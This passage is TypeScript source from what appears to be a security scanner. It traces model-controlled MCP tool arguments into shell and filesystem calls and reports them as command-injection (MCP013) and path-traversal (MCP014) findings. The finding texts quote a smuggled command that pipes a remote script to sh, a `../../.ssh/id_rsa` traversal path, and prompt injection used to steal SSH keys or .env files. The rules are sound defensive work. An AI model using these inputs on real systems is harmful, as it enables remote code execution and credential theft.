      const names = namesFor(state, taint);
      if (guardedIn(scope.fn, names, call) || scope.callers.some((c) => guardedIn(c.fn, c.names, undefined))) continue;
      const schema = scope.schema.get(taint.field);
      if (schema && RESTRICTIVE_SCHEMA.test(schema)) continue;

      const intentional = kind === "shell" ? taint.composed : taint.baseJoined;
      let evidence: Evidence = !intentional ? "heuristic" : kind === "shell" && scope.hops === 0 ? "proven" : "likely";
      const files = [relFile, ...scope.path.map((step) => step.file)];
      if (files.some(isTestFilePath)) evidence = demoteEvidence(evidence);

      const toolName = scope.hops === 0 ? dispatchedToolName(call, scope.fn, scope.toolName) : scope.toolName;
      const originSource = context.project.getSourceFile(taint.originFile);
      const trace: TraceStep[] = [
        {
          kind: "source",
          file: originSource ? getRelativeFilePath(context.rootPath, originSource) : relFile,
          line: taint.originLine,
          note: `${taint.origin} of MCP tool \`${toolName}\` (model-controlled)`,
        },
        ...scope.path,
      ];
      if (getNodeLine(argNode!) !== getNodeLine(call)) {
        trace.push({ kind: "flow", file: relFile, line: getNodeLine(argNode!), note: kind === "shell" ? "interpolated into a command string" : "joined onto a base path" });
      }
      trace.push({
        kind: "sink",
        file: relFile,
        line: getNodeLine(call),
        note: kind === "shell" ? `${calleeName(call)} (child_process, runs a shell)` : `${calleeName(call)} (fs)`,
      });
      hits.push({ kind, evidence, file: relFile, line: getNodeLine(call), toolName, trace, bare: !intentional });
      continue;
    }

    if (scope.hops >= MAX_HOPS) continue;
    // Follow tainted values into project functions: dispatch(args) / runCmd(`git ${x}`) / this.service.get(key)
    const args = call.getArguments();
    for (let index = 0; index < args.length; index += 1) {
      const isObject = isArgObject(args[index], state.objects);
      // The value reaching this call, like at a sink: a reused variable
      // passed to a wrapper is judged by what it holds here.
      let taint = isObject ? undefined : sinkArgumentTaint(args[index], call, scope.fn, state);
      let fields: Map<string, Taint> | undefined;
      const literal = unwrap(args[index]);
      if (!isObject && !taint && Node.isObjectLiteralExpression(literal)) {
        fields = new Map();
        for (const prop of literal.getProperties()) {
          const value = Node.isPropertyAssignment(prop) ? prop.getInitializer() : Node.isShorthandPropertyAssignment(prop) ? prop.getNameNode() : undefined;
          const fieldTaint = value ? expressionTaint(value, state) : undefined;
          const name = Node.isPropertyAssignment(prop) || Node.isShorthandPropertyAssignment(prop) ? prop.getName() : undefined;
          if (fieldTaint && name) fields.set(name, fieldTaint);
        }
        if (fields.size === 0) continue;
        taint = [...fields.values()][0];
      }
      if (!isObject && !taint) continue;
      const target = resolveFunction(call.getExpression(), projectFiles);
      if (!target || target === scope.fn) break;

      const toolName = scope.hops === 0 ? dispatchedToolName(call, scope.fn, scope.toolName) : scope.toolName;
      const callee = call.getExpression();
      const child: Scope = {
        toolName,
        fn: target,
        seeds: new Map(),
        argObjects: new Set(),
        schema: scope.schema,
        hops: scope.hops + 1,
        path: [
          ...scope.path,
          { kind: "flow", file: relFile, line: getNodeLine(call), note: `passed to \`${Node.isPropertyAccessExpression(callee) ? callee.getName() : callee.getText()}\`` },
        ],
        callers: [...scope.callers, { fn: scope.fn, names: taint ? namesFor(state, taint) : new Set(state.objects) }],
      };
      seedParameter(target, index, child, fields ? undefined : taint, fields);
      analyzeScope(child, context, projectFiles, visited, hits);
    }
  }
}

const cache = new WeakMap<RuleContext, SinkHit[]>();

function analyze(context: RuleContext): SinkHit[] {
  const cached = cache.get(context);
  if (cached) return cached;
  const hits: SinkHit[] = [];
  const projectFiles = new Set(context.sourceFiles);

  for (const sourceFile of context.sourceFiles) {
    if (!fileImportsMcpServerSdk(sourceFile)) continue;
    for (const handler of collectHandlers(sourceFile, projectFiles)) {
      analyzeScope(handler, context, projectFiles, new Map(), hits);
    }
  }

  // One finding per sink line (a shared helper reached from several tools reports once).
  const seen = new Set<string>();
  const unique = hits.filter((hit) => {
    const key = `${hit.kind}|${hit.file}|${hit.line}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
  cache.set(context, unique);
  return unique;
}

export const ruleMcpToolArgShell: Rule = {
  id: "MCP013",
  title: "MCP tool argument reaches a shell command",
  severity: "critical",
  run(context: RuleContext): Finding[] {
    return analyze(context)
      .filter((hit) => hit.kind === "shell")
      .map((hit) => ({
        rule_id: "MCP013",
        title: "MCP tool argument reaches a shell command",
        severity: hit.bare ? "medium" : "critical",
        file: hit.file,
        line: hit.line,
        summary: hit.bare
          ? `MCP tool \`${hit.toolName}\` runs a model-supplied command line verbatim.`
          : `MCP tool \`${hit.toolName}\` interpolates a model-controlled argument into a shell command.`,
        description: hit.bare
          ? "The tool hands a command string written by the model straight to a shell. If that is the tool's purpose, anyone who can get text in front of the model (a web page, issue, email, or file it reads) can run commands on this machine."
          : "A tool argument is interpolated into a command run through a shell. Tool arguments are written by the model, and a prompt injection in anything the model reads controls them: `main; curl evil.sh | sh` turns this tool into remote code execution. This is the most common class of real MCP server CVE.",
        recommendation:
          "Do not build shell strings. Use execFile/spawn with an argument array (no `shell: true`), validate the argument against a strict pattern or allowlist (and reject values starting with `-`), and declare it in the schema as z.enum(...) or with .regex(...).",
        confidence: evidenceConfidence(hit.evidence),
        evidence: hit.evidence,
        trace: hit.trace,
      }));
  },
};

export const ruleMcpToolArgPath: Rule = {
  id: "MCP014",
  title: "MCP tool argument used as a file path without containment",
  severity: "high",
  run(context: RuleContext): Finding[] {
    return analyze(context)
      .filter((hit) => hit.kind === "fs")
      .map((hit) => ({
        rule_id: "MCP014",
        title: "MCP tool argument used as a file path without containment",
        severity: hit.bare ? "medium" : "high",
        file: hit.file,
        line: hit.line,
        summary: hit.bare
          ? `MCP tool \`${hit.toolName}\` reads or writes any path the model supplies.`
          : `MCP tool \`${hit.toolName}\` joins a model-controlled path onto a base directory without checking it stays inside.`,
        description: hit.bare
          ? "The tool accepts an arbitrary filesystem path from the model. A prompt injection in anything the model reads can make it read ~/.ssh/id_rsa or .env and send it onward, or overwrite files."
          : "A tool argument is joined onto a base directory, but nothing checks the result stays inside it. `../../.ssh/id_rsa` (or an absolute path, which path.join/resolve accept) walks out. Path traversal is the most common real MCP server vulnerability.",
        recommendation:
          "Resolve the final path (path.resolve + fs.realpath to follow symlinks) and reject it unless it starts with the resolved base directory plus a path separator.",
        confidence: evidenceConfidence(hit.evidence),
        evidence: hit.evidence,
        trace: hit.trace,
      }));
  },
};
